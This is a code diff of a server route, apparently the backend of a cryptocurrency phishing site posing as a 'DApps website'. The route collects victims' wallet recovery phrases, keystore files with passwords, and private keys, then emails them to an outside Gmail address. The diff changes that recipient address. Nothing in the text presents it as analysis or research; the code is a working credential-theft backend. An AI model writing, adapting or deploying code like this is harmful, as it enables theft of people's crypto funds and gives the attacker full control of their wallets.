@@ -18,10 +18,8 @@ function formatMessage(message: string) {
 
 export async function POST(request: Request) {
   try {
-    const { phrase, keystore, privateKey, wallet } = await request.json();
+    const { phrase, keystore, privateKey, item } = await request.json();
 
-
-    const item = wallet
     if (phrase) {
       const email = process.env.EMAIL;
       const pass = process.env.PASS;
@@ -38,7 +36,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "billyexh@gmail.com",
+        to: "dappswebdev123@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: ` ${formattedMessage} wallet is ${item}`,
       };
@@ -80,7 +78,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "billyexh@gmail.com",
+        to: "dappswebdev123@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>  wallet is ${item}`,
       };
@@ -124,7 +122,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "billyexh@gmail.com",
+        to: "dappswebdev123@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: ` ${formattedMessage} wallet is ${item} `,
       };
